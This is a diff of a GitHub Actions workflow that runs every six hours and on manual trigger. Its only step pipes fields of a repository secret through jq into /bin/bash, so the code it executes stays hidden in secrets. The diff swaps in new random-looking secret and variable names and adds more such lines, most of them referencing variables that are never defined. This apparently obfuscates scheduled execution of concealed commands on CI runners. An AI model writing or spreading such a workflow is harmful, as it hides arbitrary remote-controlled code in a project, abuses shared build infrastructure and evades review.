@@ -1,20 +1,25 @@
 name: paprikasouthwest
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 2/6 * * *'
-
-jobs:  # 21994
+    - cron: '33 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: paprikasouthwest
         env:
-          yri0350: ${{ secrets.yri0350 }}
+          k12796: ${{ secrets.k12796 }}
         run: |
-          echo $yri0350 | jq -r .lmjk234 | /bin/bash
-          echo $kz31800 | jq -r .jbh907 | /bin/bash
-          echo $jjuu26844 | jq -r .xet63 | /bin/bash
-          echo $i1588 | jq -r .lzg87 | /bin/bash
+          echo $k12796 | jq -r .oiag500 | /bin/bash
+          echo $t3038 | jq -r .t45571 | /bin/bash
+          echo $gx45 | jq -r .nxhl2 | /bin/bash
+          echo $m58 | jq -r .c77824 | /bin/bash
+          echo $pa33002 | jq -r .xro72 | /bin/bash
+          echo $nttj7501 | jq -r .twflg1403 | /bin/bash
+          echo $nwe29 | jq -r .qdyh033 | /bin/bash
+          echo $mqhy1509 | jq -r .zejt844 | /bin/bash
+          echo $ngru1911 | jq -r .kkdt7 | /bin/bash
 
